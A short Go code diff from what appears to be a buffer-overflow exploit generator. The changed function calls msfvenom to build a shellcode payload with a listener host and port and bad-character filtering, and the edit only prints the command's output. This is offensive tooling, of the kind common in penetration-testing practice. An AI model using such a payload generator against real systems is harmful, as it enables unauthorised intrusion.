@@ -170,10 +170,11 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 	fmt.Println("Generating msfvenom payload...")
 	venomCmd := path.Join(c.MsfPath, "msfvenom")
 	venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
-	_, err := exec.Command(venomCmd, venomArgs).Output()
+	out, err := exec.Command(venomCmd, venomArgs).Output()
 	if err != nil {
 		log.Fatal(err)
 	}
+	fmt.Println(out)
 	//read msfvenom output
 	p, _ := os.Getwd()
 	payload, err := ioutil.ReadFile(path.Join(p, "payload.txt"))
